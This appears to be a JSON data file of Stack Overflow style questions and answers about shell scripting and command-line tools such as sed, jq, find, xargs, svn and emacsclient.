    "SVN - Get all commit messages for a file?": "svn log filename will show all commit messages associated with filename. The output will look something like the following:\n------------------------------------------------------------------------\nr1206 | kalebp | 2010-03-10 16:48:12 -0800 (Wed, 10 Mar 2010) | 1 line\n\nIntroduce a TranslatorFacade. Make the jar runnable by default.\n------------------------------------------------------------------------\nr1085 | kalebp | 2010-03-02 17:10:28 -0800 (Wed, 04 Nov 2009) | 1 line\n\nAnnotation checker now supports complete definitions and named parameters\n------------------------------------------------------------------------\n...\nIf you don't want information prior to a branch or copy there is a --stop-on-copy option that you can add. See svn help log for more information, such as how to specify date ranges, etc.\nEDIT:\nYou can easily grab by a date range using svn log -r{20100101}:{20100331}. I don't like the idea of calling log for changed files, so I'd recommend using the -v flag to get a list of files that changed in the commit.\nHere's the process that I would use:\nsvn log -r{20100101}:{20100331} -v --xml | xsltproc formatter.xsl -\nAnd here's formatter.xsl:\n<xsl:stylesheet\n        xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n        xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n        exclude-result-prefixes=\"xsd\"\n        version=\"1.0\"\n        >\n\n<xsl:output method=\"text\" indent=\"no\" />\n\n<xsl:key name=\"paths-key\" match=\"/log/logentry/paths\" use=\"path\" />\n\n<xsl:template match=\"log/logentry\">\n        <xsl:for-each select=\"paths/path[count(. | key('paths-key', paths/path)[1]) = 1]\">\n                <xsl:sort select=\"text()\"/>\n                -- <xsl:value-of select=\"text()\" />\n                <xsl:for-each select=\"key('paths-key', .)/preceding-sibling::date\">\n                        <xsl:sort select=\"translate(text(), '-:.T','')\"/>\n                        <xsl:variable name=\"selectedDate\" select=\"text()\"/>\n                        <xsl:value-of select=\"translate($selectedDate, 'T', ' ')\"/><xsl:text>\n                        </xsl:text>\n                        <xsl:for-each select=\"following-sibling::msg\">\n                                * <xsl:variable name=\"msg\" select=\"text()\"/>\n                                <xsl:variable name=\"date\" select=\"preceding-sibling::date/text()\"/>\n                                <xsl:if test=\"$selectedDate = $date\">\n                                        <xsl:text>   </xsl:text>\n                                        <xsl:value-of select=\"$msg\"/>\n                                </xsl:if>\n                        </xsl:for-each>\n                </xsl:for-each>\n        </xsl:for-each>\n</xsl:template>\n\n</xsl:stylesheet>",
    "Open an Emacs buffer when a command tries to open an editor in shell-mode": "You can attach to an Emacs session through emacsclient. First, start the emacs server with\nM-x server-start\nor add (server-start) to your .emacs. Then,\nexport VISUAL=emacsclient\nEdit away.\nNote:\nThe versions of emacs and emacsclient must agree. If you have multiple versions of Emacs installed, make sure you invoke the version of emacsclient corresponding to the version of Emacs running the server.\nIf you start the server in multiple Emacs processes/frames (e.g., because (server-start) is in your .emacs), the buffer will be created in the last frame to start the server.",
    "Python subprocess.call not waiting for process to finish blender": "You can use subprocess.call to do exactly that.\nsubprocess.call(args, *, stdin=None, stdout=None, stderr=None, shell=False, timeout=None)\nRun the command described by args. Wait for command to complete, then return the returncode attribute.\nEdit: I think I have a hunch on what's going on. The command works on your Mac because Macs, I believe, support Bash out of the box (at least something functionally equivalent) while on Windows it sees your attempt to run a \".sh\" file and instead fires up Git Bash which I presume performs a couple forks when starting.\nBecause of this Python thinks that your script is done, the PID is gone.\nIf I were you I would do this:\nGenerate a unique, non-existing, absolute path in your \"launching\" script using the tempfile module.\nWhen launching the script, pass the path you just made as an argument.\nWhen the script starts, have it create a file at the path. When done, delete the file.\nThe launching script should watch for the creation and deletion of that file to indicate the status of the script.\nHopefully that makes sense.",
    "Get javascript rendered html source using phantomjs": "Unfortunately, that is not possible using just the PhantomJS command line. You have to use a Javascript file to actually accomplish anything with PhantomJS.\nHere is a very simple version of the script you can use\nCode mostly copied from https://stackoverflow.com/a/12469284/4499924\nprintSource.js\nvar system = require('system');\nvar page   = require('webpage').create();\n// system.args[0] is the filename, so system.args[1] is the first real argument\nvar url    = system.args[1];\n// render the page, and run the callback function\npage.open(url, function () {\n  // page.content is the source\n  console.log(page.content);\n  // need to call phantom.exit() to prevent from hanging\n  phantom.exit();\n});\nTo print the page source to standard out.\nphantomjs printSource.js http://todomvc.com/examples/emberjs/\nTo save the page source in a file\nphantomjs printSource.js http://todomvc.com/examples/emberjs/ > ember.html",
    "Cannot find the file specified when using subprocess.call('dir', shell=True) in Python": "I think you may have a problem with your COMSPEC environment variable:\n>>> import os\n>>> os.environ['COMSPEC']\n'C:\\\\Windows\\\\system32\\\\cmd.exe'\n>>> import subprocess\n>>> subprocess.call('dir', shell=True)\n\n    (normal output here)\n\n>>> os.environ['COMSPEC'] = 'C:\\\\nonexistent.exe'\n>>> subprocess.call('dir', shell=True)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"c:\\Python27\\lib\\subprocess.py\", line 493, in call\n    return Popen(*popenargs, **kwargs).wait()\n  File \"c:\\Python27\\lib\\subprocess.py\", line 679, in __init__\n    errread, errwrite)\n  File \"c:\\Python27\\lib\\subprocess.py\", line 896, in _execute_child\n    startupinfo)\nWindowsError: [Error 2] The system cannot find the file specified\nI discovered this potential issue by digging into subprocess.py and looking in the _execute_child function, as pointed-to by the traceback. There, you'll find a block starting with if shell: that will search the environment for said variable and use it to create the arguments used to launch the process.",
    "Best way to define \"conditional\" aliases in shell": "I don't see how the simple obvious POSIX variant would have any drawbacks compared to the (mostly non-portable) alternatives you propose.\ntype ag >/dev/null 2>&1 && alias grep=ag",
    "Exiting a shell script from inside a while loop": "You need to avoid creating sub-shell in your script by avoiding the pipe and un-necessary cat:\nINPSTR=\"$1\"\n\nwhile read -r line\ndo\n    if [[ $line == *\"$INPSTR\"* ]]; then\n        exit 0\n    fi\ndone < ~/file.txt\n\n#string not found\nexit 1\nOtherwise exit 0 is only exiting from the sub-shell created by pipe and later when loop ends then exit 1 is used from parent shell.",
    "Escaping Shell Commands In java?": "I would suggest using ProcessBuilder or one of the Runtime.exec methods which does not run through the shell and thus does not require shell escaping to avoid injection attacks (here).\nProcessBuilder -- more flexible than Runtime.exec.\nRuntime.exec(String[]) -- differs from the form that takes only a String\nIt may also beneficial to consider using the process's STDIN pipe to transfer the XML data -- Perl can trivially handle reading from STDIN. There are generally limits with command-line arguments.\nHappy coding.",
    "Configure shell to always print prompt on new line, like zsh": "A little trick using PROMPT_COMMAND:\nThe value of the variable PROMPT_COMMAND is examined just before Bash prints each primary prompt. If PROMPT_COMMAND is set and has a non-null value, then the value is executed just as if it had been typed on the command line.\nHence, if you put this in your .bashrc:\n_my_prompt_command() {\n    local curpos\n    echo -en \"\\E[6n\"\n    IFS=\";\" read -sdR -a curpos\n    ((curpos[1]!=1)) && echo -e '\\E[1m\\E[41m\\E[33m%\\E[0m'\n}\nPROMPT_COMMAND=_my_prompt_command\nyou'll be quite good. Feel free to use other fancy colors in the echo \"%\" part. You can even put the content of that in a variable so that you can modify it on the fly.\nThe trick: obtain the column of the cursor (with echo -en \"\\E[6n\" followed by the read command) before printing the prompt and if it's not 1, print a % and a newline.\nPros:\npure bash (no external commands),\nno subshells,\nleaves your PS1 all nice and clean: if you want to change your PS1 sometimes (I do this when I work in deeply nested directory \u2014 I don't like having prompts that run on several miles), this will still work.\nAs tripleee comments, you could use stty instead of echoing a hard-coded control sequence. But that uses an external command and is not pure bash anymore. Adapt to your needs.\nRegarding your problem with the ugly character codes that get randomly printed: this might be because there's still some stuff in the tty buffer. There might be several fixes:\nTurn off and then on the echo of the terminal, using stty.\nset_prompt() {\n    local curpos\n    stty -echo\n    echo -en '\\033[6n'\n    IFS=';' read -d R -a curpos\n    stty echo\n    (( curpos[1] > 1 )) && echo -e '\\033[7m%\\033[0m'\n}\nPROMPT_COMMAND=set_prompt\nthe main difference is that the echo/read combo has been wrapped with stty -echo/stty echo that respectively disables and enables echoing on terminal (that's why the -s option to read is now useless). In this case you won't get the cursor position correctly and this might lead to strange error messages, or the % not being output at all.\nExplicitly clear the tty buffer:\nset_prompt() {\n    local curpos\n    while read -t 0; do :; done\n    echo -en '\\033[6n'\n    IFS=';' read -s -d R -a curpos\n    (( curpos[1] > 1 )) && echo -e '\\033[7m%\\033[0m'\n}\nPROMPT_COMMAND=set_prompt\nJust give up if the tty buffer can't be cleaned:\nset_prompt() {\n    local curpos\n    if ! read -t 0; then\n        echo -en '\\033[6n'\n        IFS=';' read -s -d R -a curpos\n        (( curpos[1] > 1 )) && echo -e '\\033[7m%\\033[0m'\n    # else\n    #     here there was still stuff in the tty buffer, so I couldn't query the cursor position\n    fi\n}\nPROMPT_COMMAND=set_prompt\nAs a side note: instead of reading in an array curpos, you can directly obtain the position of the cursor in variables, say, curx and cury as so:\nIFS='[;' read -d R _ curx cury\nIf you only need the y-position cury:\nIFS='[;' read -d R _ _ cury",
    "Is it possible to edit a symlink with a text editor?": "Yes, in Emacs this is possible in dired-mode, specifically wdired (writable dired) mode.\nNote, dired and wdired both are built-in packages.\nHere's an example...\n(BTW: I'm using Smex to give Emacs M-x command search & execute a more ergonomic UI + fuzzy matching)",
    "Chain commands on the PowerShell command line (like POSIX sh &&) [duplicate]": "Try this:\n$errorActionPreference='Stop'; cmd1; cmd2",
    "How do I speed up emacs output from an asynchronous shell-command?": "Like the documentation says, shell-command runs the command in an inferior shell, implying shell-mode. If you just want the output and none of the features, running the command with start-process may be closer to what you want.\n(start-process \"*verbose-app*\" \"*verbose-app*\"\n \"/bin/sh\" \"-c\" \"verbose-app\")\nWrapping this into a function should not be too hard. You might want to look at how shell-command implements async commands; for example, it will ask whether it should terminate an existing process if you attempt to create one when another already exists. http://git.savannah.gnu.org/cgit/emacs.git/tree/lisp/simple.el#n2447 might be a good starting point. (In case the link goes bad, this is a link to inside defun shell-command, pointing to a a comment about handling the ampersand. If it's there, the command will be run asynchronously.)",
    "What does the sh:cannot set terminal process group (-1) inappropriate ioctl for device error mean?": "That error message likely means shell is probably calling tcsetpgrp() and getting back errno=ENOTTY. That can happen if the shell process does not have a controlling terminal. The kernel doesn't set that up before running init on /dev/console.\nYou have already discovered the solution: use a real terminal device like /dev/tty0.",
    "How to redirect stdout+stderr to one file while keeping streams separate?": "From what I unterstand this is what you are looking for. First I made a litte script to write on stdout and stderr. It looks like this:\n$ cat foo.sh \n#!/bin/bash\n\necho foo 1>&2\necho bar\nThen I ran it like this:\n$ ./foo.sh 2> >(tee stderr | tee -a combined) 1> >(tee stdout | tee -a combined)\nfoo\nbar\nThe results in my bash look like this:\n$ cat stderr\nfoo\n$ cat stdout \nbar\n$ cat combined \nfoo\nbar\nNote that the -a flag is required so the tees don't overwrite the other tee's content.",
    "Send keystrokes to non-active GUI application without occupying the keyboard": "Use a nested X server to input keystrokes without changing focus or keyboard grab. Proof of concept:\nXephyr -resizeable :13\nexport DISPLAY=:13\nxterm\nxdotool type rhabarber\nThe Xephyr nested X server is started and will listen on local X socket 13 (whereas :0 typically identifies the currently running X server, but when multiple sessions are ran concurrently, it could be higher). Then we set DISPLAY environment variable to :13, so any X application we start will connect to Xephyr; xterm is our target application here. Using xdotool or any other tool we can send keystrokes.\nAs the target X server is identified through $DISPLAY, applications can be started or input events triggered from elsewhere as well. If needed, you might also run a lightweight window manager within Xephyr, e.g. to 'maximize' the application so that it fills the whole Xephyr window.",
    "List all files that do not match pattern using ls [duplicate]": "this may be help you\nls --ignore=*.txt\nIt will not display the .txt files in your directory.",
    "Convert to uppercase in shell": "If you want to store the result of a back in a, then you can do use command substitution:\nread a;\na=$(echo $a | tr 'a-z' 'A-Z')\necho $a",
    "Split large string into substrings": "${string:position:length}\nExtracts $length characters of substring from $string at $position.\nstringZ=abcABC123ABCabc\n#       0123456789.....\n#       0-based indexing.\n\necho ${stringZ:0}          # abcABC123ABCabc\necho ${stringZ:1}          # bcABC123ABCabc\necho ${stringZ:7}          # 23ABCabc\n\necho ${stringZ:7:3}        # 23A\n                           # Three characters of substring.\n-- from Manipulating Strings in the Advanced Bash-Scripting Guide by Mendel Cooper\nThen use a loop to go through and add 1 to the position to extract each substring of length 5.\nend=$(( ${#stringZ} - 5 ))\nfor i in $(seq 0 $end); do\n    echo ${stringZ:$i:5}\ndone",
    "shell: delete the last line of a huge text log file [duplicate]": "To get the file content without the last line, you can use\nhead -n-1 logfile.log\n(I am not sure this is supported everywhere)\nor\nsed '$d' logfile.log",
    "How to detect whether a PHP script is already running?": "",
    "Problem installing ShellEd plugin in Eclipse Helios": "I have found http://www.chasetechnology.co.uk/eclipse/updates to be easier to install\nAfter installing Linux Man page, install ShellEd from the above link.\ngo Help => install new software => Add \nName: ShellEd \nLocation: http://www.chasetechnology.co.uk/eclipse/updates\nRestart eclipse\nclose and reopen andy shell file and voala syntax highlighing will be there!!!\nNote that ShellEd does not create a new Perspective though.\nBut *.sh, *.bash, *.csh, *.ksh and few other sh file extentions are associated to ShellEd.\nEnjoy!!!",
    "Validate date format in a shell script": "Use date\ndate \"+%d/%m/%Y\" -d \"09/99/2013\" > /dev/null  2>&1\n is_valid=$?\nThe date string must be in \"MM/DD/YYYY\" format.\nIf you do not get 0 then date is in invalid format.",
    "Bash: Inserting one file's content into another file after the pattern": "sed can do that without loops. Use its r command:\nsed -e '/pattern/rFILE1' FILE2\nTest session:\n$ cd -- \"$(mktemp -d)\" \n$ printf '%s\\n' 'nuts' 'bolts' > first_file.txt\n$ printf '%s\\n' 'foo' 'bar' 'baz' > second_file.txt\n$ sed -e '/bar/r./first_file.txt' second_file.txt\nfoo\nbar\nnuts\nbolts\nbaz",
    "Cygwin shell doesn't execute .bashrc": "On cygwin, I add this to my ~/.bash_profile:\n. ~/.bashrc",
    "Piping (or command chaining) with QProcess": "The problem is you cannot run a system command with QProcess, but only a single process. So the workaround will be to pass your command as an argument to bash:\nprocess.start(\"bash\", QStringList() << \"-c\" << \"cat file | grep string\");",
    "In Linux terminal, how to delete all files in a directory except one or two": "From within the directory, list the files, filter out all not containing 'file-to-keep', and remove all files left on the list.\nls | grep -v 'file-to-keep' | xargs rm\nTo avoid issues with spaces in filenames (remember to never use spaces in filenames), use find and -0 option.\nfind 'path' -maxdepth 1 -not -name 'file-to-keep' -print0 | xargs -0 rm\nOr mixing both, use grep option -z to manage the -print0 names from find",
    "Shell Script compare file content with a string": "Update: My original answer would unnecessarily read a large file into memory when it couldn't possibly match. Any multi-line file would fail, so you only need to read two lines at most. Instead, read the first line. If it does not match the string, or if a second read succeeds at all, regardless of what it reads, then send the e-mail.\nstr=ABCD\nif { IFS= read -r line1 &&\n     [[ $line1 != $str ]] ||\n     IFS= read -r $line2\n   } < test.txt; then\n    # send e-mail\nfi \nJust read in the entire file and compare it to the string:\nstr=ABCD\nif [[ $(< test.txt) != \"$str\" ]]; then\n    # send e-mail\nfi",
    "How do I JS-Beautify recursively?": "However, JS-beautify does work ... in case of all the files in a directory but not in sub-directory\nYou've mentioned that JS-beautify works if all the input files are in the same directory. Your command doesn't probably work because you pass all the results from find which might include input files from different directories.\nAs mentioned in the comment earlier, you could use -exec instead:\nfind . -type f -name \"*.html\" -exec js-beautify -r {} \\;\nNewer versions of GNU find might use this syntax:\nfind . -type f -name \"*.html\" -exec js-beautify -r {} +",
    "How to combine \"lsof -i :port\" and \"kill pid\" in bash": "You can use $():\nkill $(lsof -t -i:port)",
    "Remove all files in a directory (do not touch any folders or anything within them)": "Although find allows you to delete files using -exec rm {} \\; you can use\nfind /direcname -maxdepth 1 -type f -delete\nand it is faster. Using -delete implies the -depth option, which means process directory contents before directory.",
    "How can I convert my JSON to CSV using jq?": "Building upon Joe Harris' answer, you can use the @csv filter so that strings are properly quoted and escaped when necessary :\njq -r '[.case, .custom.\"speech invoked\", .custom.\"input method\"] | @csv'",
    "My Bash aliases don't work": "Add this to the end of your .bashrc:\nif [ -f $HOME/.bash_aliases ]\nthen\n  . $HOME/.bash_aliases\nfi",
    "How do I read the Nth line of a file and print it to a new file? [duplicate]": "Sed can help you.\nRecall that sed will normally process all lines in a file AND print each line in the file.\nYou can turn off that feature, and have sed only print lines of interest by matching a pattern or line number.\nSo, to print the 2nd line of file 2, you can say\nsed -n '2p' file2 > newFile2\nTo print the 2nd line and then stop processing add the q (for quit) command (you also need braces to group the 2 commands together), i.e.\nsed -n '2{p;q;}' file2 > newFile2\n(if you are processing large files, this can be quite a time saving).\nTo make that more general, you can change the number to a variable that will hold a number, i.e.\n  lineNo=3\n  sed -n \"${lineNo}{p;q;}\" file3 > newFile3\nIf you want all of your sliced lines to go into 1 file, then use the shells 'append-redirection', i.e.\n for lineNo in 1 2 3 4 5 ; do\n     sed -n  \"${lineNo}{p;q;}\" file${lineNo} >> aggregateFile\n done\nThe other postings, with using the results of find ... to drive your filelist, are an excellent approach.\nI hope this helps.",
    "Retrieve parent directory of script": "How about using dirname twice?\nAPP_ROOT=\"$(dirname \"$(dirname \"$(readlink -fm \"$0\")\")\")\"\nThe quoting desaster is only necessary to guard against whitespace in paths. Otherwise it would be more pleasing to the eye:\nAPP_ROOT=$(dirname $(dirname $(readlink -fm $0)))",
    "How to get rid of the headers in a ps command in Mac OS X ?": "The BSD (and more generally POSIX) equivalent of GNU's ps --no-headers is a bit annoying, but, from the man page:\n -o      Display information associated with the space or comma sepa-\n         rated list of keywords specified.  Multiple keywords may also\n         be given in the form of more than one -o option.  Keywords may\n         be appended with an equals (`=') sign and a string.  This\n         causes the printed header to use the specified string instead\n         of the standard header.  If all keywords have empty header\n         texts, no header line is written.\nSo:\nps -p 747 -o '%cpu=,%mem='\nThat's it.\nIf you ever do need the remove the first line from an arbitrary command, tail makes that easy:\nps -p 747 -o '%cpu,%mem' | tail +2\nOr, if you want to be completely portable:\nps -p 747 -o '%cpu,%mem' | tail -n +2\nThe cut command is sort of the column-based equivalent of the simpler row-based commands head and tail. (If you really do want to cut columns, it works\u2026 but in this case, you probably don't; it's much simpler to pass the -o params you want to ps in the first place, than to pass extras and try to snip them out.)\nMeanwhile, I'm not sure why you think you need to eval something as the argument to echo, when that has the same effect as running it directly, and just makes things more complicated. For example, the following two lines are equivalent:\necho \"$(ps -p 747 -o %cpu,%mem)\" | cut -c 1-5\nps -p 747 -o %cpu,%mem | cut -c 1-5",
    "Bash. Get intersection from multiple files": "Can you use\nsort t1 t2 | uniq -d\nThis will combine the two files, sort them, and then display only the lines that appear more than once: that is, the ones that appear in both files.\nThis assumes that each file contains no duplicates within it, and that the inodes are the same in all the structures for a particular file.",
    "Find and replace in shell scripting": "Sure, you can do this using sed or awk. sed example:\nsed -i 's/Andrew/James/g' /home/oleksandr/names.txt",
    "Remove line breaks in Bourne Shell from variable": "echo $VALUES | tr '\\n' ' '",
    "How do you use newgrp in a script then stay in that group when the script exits": "The following works nicely; put the following bit at the top of the (Bourne or Bash) script:\n### first become another group\ngroup=admin\n\nif [ $(id -gn) != $group ]; then\n  exec sg $group \"$0 $*\"\nfi\n\n### now continue with rest of the script\nThis works fine on Linuxen. One caveat: arguments containing spaces are broken apart. I suggest you use the env arg1='value 1' arg2='value 2' script.sh construct to pass them in (I couldn't get it to work with $@ for some reason)",
    "Google cloud shell missing web preview button": "This is due to a CSS bug. When you have the Google Cloud Platform navigation panel on the left opened, then open a Cloud Shell, the Web Preview button is pushed off the screen.\nTo fix, simply close the navigation panel by pressing the hamburger button in the top left. (You can reopen the panel, and the Web Preview button will be fixed.)",
    "Zero-padding a string/file name in shell script": "Use printf, just like in C. It's available in any POSIXly Bourne Shell (zsh, ksh, bash, ...)\n$ FILE=$(printf %04d 42).txt\n$ echo \"$FILE\"\n0042.txt",
    "Recursive Grep to show only total matchin count": "grep -ro \"foo\" /some/directory | wc -l | xargs echo \"Total matches :\"\nThe -o option of grep prints all the existing occurences of a string in a file.",
    "@reboot is not working in CRON": "Try man 5 crontab. If your crontab supported, you should see @reboot, @yearly, @monthly,.,,,\nthen try add some sleep for moment may can help.\n@reboot sleep 60;/root/s3-mount.sh",
    "In a makefile, how to get the relative path from one absolute path to another?": "You can use the shell function, and use realpath(1) (which is part of coreutils) and the --relative-to flag.\nHere is an example:\nRELATIVE_FILE1_FILE2:=$(shell realpath --relative-to $(FILE1) $(FILE2))\nYou can even process a whole list of files with one invocation of realpath(1) since it knows how to process many file names.\nHere is an example:\nRELATIVES:=$(shell realpath --relative-to $(RELATIVE) $(FILES))",
    "Use of \\c in shell scripting": "The \\c keeps the cursor on the same line after the end of the echo, but to enable it, you need the -e flag:\necho -e \"bla bla \\c\"",
    "Specifying the default database for psql to connect to?": "You can configure the default behavior of psql -- and in fact any program using the libpq client library -- through environment variables.\nIn your ~/.bashrc or similar:\nexport PGDATABASE=postgres\nThe PostgreSQL documentation contains a complete list.",
    "The issue of * in Command line argument": "That's because * is a shell wildcard: it has a special meaning to the shell, which expands it before passing it on to the command (in this case, java).\nSince you need a literal *, you need to escape it from the shell. The exact way of escaping varies depending on your shell, but you can try:\njava ProgramName 5 3 \"*\"\nOr:\njava ProgramName 5 3 \\*\nBy the way, if you want to know what the shell does with the *, try printing the content of String[] args to your main method. You'll find that it will contain names of the files in your directory.\nThis can be handy if you need to pass some filenames as command line arguments.\nSee also\nWikipedia: glob\nFor example, if a directory contains two files, a.log and b.log then the command cat *.log will be expanded by the shell to cat a.log b.log\nWikipedia: Escape character\nIn Bourne shell (sh), the asterisk (*) and question mark (?) characters are wildcard characters expanded via globbing. Without a preceding escape character, an * will expand to the names of all files in the working directory that don't start with a period if and only if there are such files, otherwise * remains unexpanded. So to refer to a file literally called \"*\", the shell must be told not to interpret it in this way, by preceding it with a backslash (\\).",
    "Find, grep, and execute - all in one?": "You bet. The usual thing is something like\n  $ find /path -name pattern -print | xargs command\nSo you might for example do\n  $ find . -name '*.[ch]' -print | xargs grep -H 'main' \n(Quiz: why -H?)\nYou can carry on with this farther; for example. you might use\n  $ find . -name '*.[ch]' -print | xargs grep -H 'main' | cut -d ':' -f 1\nto get the vector of file names for files that contain 'main', or\n  $ find . -name '*.[ch]' -print | xargs grep -H 'main' | cut -d ':' -f 1 |\n      xargs growlnotify -\nto have each name become a Growl notification.\nYou could also do\n $ grep pattern `find /path -name pattern`\nor\n $ grep pattern $(find /path -name pattern)\n(in bash(1) at least these are equivalent) but you can run into limits on the length of a command line that way.\nUpdate\nTo answer your questions:\n(1) You can do anything in bash you can do in sh. The one thing I've mentioned that would be any different is the use of $(command) in place of using backticks around command, and that works in the version of sh on Macs. The csh, zsh, ash, and fish are different.\n(2) I think merely doing $ open $(dirname arg) will opena finder window on the containing directory.",
    "How to call Shell script or python script in from a Atom electron app": "It can be done directly with Node, you can use the child_process module. Please notice this is asynchronous.\nconst exec = require('child_process').exec;\n\nfunction execute(command, callback) {\n    exec(command, (error, stdout, stderr) => { \n        callback(stdout); \n    });\n};\n\n// call the function\nexecute('ping -c 4 0.0.0.0', (output) => {\n    console.log(output);\n});\nI encourage you to also have a look at npm, there are tons of modules that could help you to do what you want, without calling a python script.",
    "How to create a user in linux using python": "Use useradd, it doesn't ask any questions but accepts many command line options.",
    "UNIX command to list folders with file counts": "I've come up with this one:\nfind -maxdepth 1 -type d | while read dir; do \n    count=$(find \"$dir\" -maxdepth 1 -iname \\*.jpg | wc -l)\n    echo \"$dir ; $count\"\ndone\nDrop the second -maxdepth 1 if the search within the directories for jpg files should be recursive considering sub-directories. Note that that only considers the name of the files. You could rename a file, hiding that it is a jpg picture. You can use the file command to do a guess on the content, instead (now, also searches recursively):\nfind -mindepth 1 -maxdepth 1 -type d | while read dir; do \n    count=$(find \"$dir\" -type f | xargs file -b --mime-type | \n            grep 'image/jpeg' | wc -l)\n    echo \"$dir ; $count\"\ndone\nHowever, that is much slower, since it has to read part of the files and eventually interpret what they contain (if it is lucky, it finds a magic id at the start of the file). The -mindepth 1 prevents it from printing . (the current directory) as another directory that it searches.",
    "Bash regex matching not working [duplicate]": "Don't use quotes \"\"\nif [[ \"$output\" =~ ^CMD\\[.*?\\]$ ]]; then\nThe regex operator =~ expects an unquoted regular expression on its RHS and does only a sub-string match unless the anchors ^ (start of input) and $ (end of input) are also used to make it match the whole of the LHS.\nQuotations \"\" override this behaviour and force a simple string match instead i.e. the matcher starts looking for all these characters \\[.*?\\] literally.",
    "Is there a way to force a shell script to run under bash instead of sh? [closed]": "As Richard Pennington says, the right way to do that is to have\n#!/bin/bash\nas the first line of the script.\nBut that's not going to help if users invoke it using sh explicitly. For example, if I type\nsh your-script-name\nthe #! line will be ignored.\nYou can't really prevent people from doing that, but you can discourage it by adding something like this at the top of the script:\n#!/bin/bash\n\nif [ ! \"$BASH_VERSION\" ] ; then\n    echo \"Please do not use sh to run this script ($0), just execute it directly\" 1>&2\n    exit 1\nfi\nOr you could do something like:\n#!/bin/bash\n\nif [ ! \"$BASH_VERSION\" ] ; then\n    exec /bin/bash \"$0\" \"$@\"\nfi\nbut that could go very wrong very easily; for example, it's probably not guaranteed that $0, which is normally the name of the script, is actually a name you can use to invoke it. I can imagine this going into an infinite loop if you get it wrong or if your system is slightly misconfigured.\nI recommend the error message approach.\n(Note: I've just edited this answer so the error message includes the name of the script, which could be helpful to users.)",
    "Why doesn't \"sort file1 > file1\" work?": "As other people explained, the problem is that the I/O redirection is done before the sort command is executed, so the file is truncated before sort gets a chance to read it. If you think for a bit, the reason why is obvious - the shell handles the I/O redirection, and must do that before running the command.\nThe sort command has 'always' (since at least Version 7 UNIX) supported a -o option to make it safe to output to one of the input files:\nsort -o file1 file1 file2 file3\nThe trick with tee depends on timing and luck (and probably a small data file). If you had a megabyte or larger file, I expect it would be clobbered, at least in part, by the tee command. That is, if the file is large enough, the tee command would open the file for output and truncate it before sort finished reading it.",
    "Forming sanitary shell commands or system calls in Ruby": "It doesn't look like you need a shell for what you're doing. See the documentation for system here: http://ruby-doc.org/core/classes/Kernel.html#M001441\nYou should use the second form of system. Your example above would become:\nsystem 'usermod', '-p', @options['shadow'], @options['username']\nA nicer (IMO) way to write this is:\nsystem *%W(usermod -p #{@options['shadow']} #{@options['username']})\nThe arguments this way are passed directly into the execve call, so you don't have to worry about sneaky shell tricks.",
    "New Application Process from Bash Shell": "Add a & to the end of the command:\nnotepad hello.txt &",
    "Remove escape sequence characters like newline, tab and carriage return from JSON file": "A pure jq solution:\n$ jq -r '.content.message | gsub(\"[\\\\n\\\\t]\"; \"\")' file.json\nERROR LALALLAERROR INFO NANANANSOME MORE ERROR INFOBABABABABABBA BABABABA ABABBABAA BABABABAB\nIf you want to keep the enlosing \" characters, omit -r.\nNote: peak's helpful answer contains a generalized regular expression that matches all control characters in the ASCII and Latin-1 Unicode range by way of a Unicode category specifier, \\p{Cc}. jq uses the Oniguruma regex engine.\nOther solutions, using an additional utility, such as sed and tr.\nUsing sed to unconditionally remove escape sequences \\n and t:\n$ jq '.content.message' file.json | sed 's/\\\\[tn]//g'\n\"ERROR LALALLAERROR INFO NANANANSOME MORE ERROR INFOBABABABABABBA BABABABA ABABBABAA BABABABAB\"\nNote that the enclosing \" are still there, however. To remove them, add another substitution to the sed command:\n$ jq '.content.message' file.json | sed 's/\\\\[tn]//g; s/\"\\(.*\\)\"/\\1/'\nERROR LALALLAERROR INFO NANANANSOME MORE ERROR INFOBABABABABABBA BABABABA ABABBABAA BABABABAB\nA simpler option that also removes the enclosing \" (note: output has no trailing \\n):\n$ jq -r '.content.message' file.json | tr -d '\\n\\t'\nERROR LALALLAERROR INFO NANANANSOME MORE ERROR INFOBABABABABABBA BABABABA ABABBABAA BABABABAB\nNote how -r is used to make jq interpolate the string (expanding the \\n and \\t sequences), which are then removed - as literals - by tr.",
    "Linux shell programming string compare syntax": "The single equal is correct\nstring1 == string2\nstring1 = string2\nTrue if the strings are equal. \u2018=\u2019 should be used with the test command for POSIX conformance\nNAME=\"rafael\"\nUSER=\"rafael\"\nif [ \"$NAME\" = \"$USER\" ]; then\n    echo \"Hello\"\nfi",
    "how to make this \"action-packed, random data\" being echoed in a terminal?": "There's a utility call script (ironically) that does what you're talking about. It can even record timing data so the playback is done at the same rate the original actions were performed.\nTo start recording and capture timing data:\n$ script -t script.out 2>timing.out\nWhen you're finished, enter exit.\nTo replay the recorded session including the original timing:\n$ scriptreplay timing.out script.out\nEdit:\nYou can simulate typing or slow dialup data transmission using the pv utility. The command below will output the file at 37 characters per second (roughly approximating a 300 baud modem).\npv -q -L 37 somefile\nHere's another idea:\nhexdump -C /dev/urandom | pv -q -L 1200\nThis gives Matrix-like output on the screen:\n#!/bin/bash\nprintf \"\\e[32m\\n\"\nwhile :\ndo\n    for i in {1..16}\n    do\n        ((r = $RANDOM % 2))\n        if (($RANDOM % 5 == 1))\n        then\n            if (($RANDOM % 4 == 1))\n            then\n                v+=\"\\e[1m $r   \"\n            else\n                v+=\"\\e[2m $r   \"\n            fi\n        else\n            v+=\"     \"\n        fi\n    done\n    printf \"$v\\n\"\n    v=\"\"\ndone",
    "How to assign git commit hash to a variable in Jenkins File": "",
    "Making a curl to an API and get an specific field from the JSON": "By using jq you could parse the json data instead of the text based parsing.\ncurl -X GET \"https://api.mercadolibre.com/items/MLA511127356\" | jq '.[].id'",
    "Change Default Group in Script": "Try the newgrp command, which changes the primary group of a user into another group of which that user is a member:\n#!/bin/bash\n\nnewgrp groupb << END\n    touch \"myscript_output.txt\"\nEND",
    "How to run a shell command in ansible's check mode?": "Starting from Ansible 2.2, the right way to do it is to use check_mode: false:\n- name: this task will make changes to the system even in check mode\n  command: /something/to/run --even-in-check-mode\n  check_mode: false",
    "Why does 'top | grep > file' not work?": "By default, grep buffers output which implies that nothing would be written to top.log until the grep output exceeds the size of the buffer (which might vary across systems).\nTell grep to use line buffering on output. Try:\ntop -b -d 1 | grep --line-buffered java > top.log",
